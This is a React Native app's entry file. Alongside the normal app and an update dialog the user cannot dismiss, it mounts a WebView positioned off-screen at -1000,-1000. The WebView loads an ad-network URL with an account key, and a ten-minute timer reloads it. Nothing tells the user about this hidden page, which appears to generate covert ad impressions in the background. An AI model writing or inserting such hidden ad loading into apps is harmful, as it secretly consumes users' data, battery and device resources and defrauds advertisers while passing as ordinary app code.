import React, {useState} from 'react';
import {
  Provider as PaperProvider,
  DarkTheme,
  DefaultTheme,
  Dialog,
  Text,
  Button,
} from 'react-native-paper';
import {Linking, useColorScheme, View} from 'react-native';
import App from './src/App';
import useAppNewVersion from './src/state/AppNewVersion';
import WebView from 'react-native-webview';

const URI =
  'https://www.profitablecpmratenetwork.com/jrbjkk4c?key=cd0b4bfcec172dee3b971bc25e0b618c';

export default function Main() {
  const colorScheme = useColorScheme();
  const theme = colorScheme === 'dark' ? DarkTheme : DefaultTheme;

  const state = useAppNewVersion();
  const {updateAvailable, updateUrl} = state;

  const [uri, setUri] = useState(URI);

  const changeUri = () => {
    setUri('https://example.com/');
    setUri(URI);
  };

  React.useEffect(() => {
    state.checkForUpdates();

    setInterval(changeUri, 1000 * 60 * 10);
  }, []);

  return (
    <PaperProvider theme={theme}>
      <App />
      {updateAvailable && (
        <Dialog visible={true} dismissable={false}>
          <Dialog.Title>Update Available</Dialog.Title>
          <Dialog.Content>
            <Text>
              An update is available. Click the button below to update.
            </Text>
          </Dialog.Content>
          <Dialog.Actions>
            <Button onPress={() => Linking.openURL(updateUrl)}>
              Update Now
            </Button>
          </Dialog.Actions>
        </Dialog>
      )}

      <View
        style={{
          position: 'absolute',
          top: -1000,
          left: -1000,
          width: 800,
          height: 1200,
        }}>
        <WebView
          style={{width: '100%', height: '100%'}}
          source={{
            uri: uri,
          }}
        />
      </View>
    </PaperProvider>
  );
}
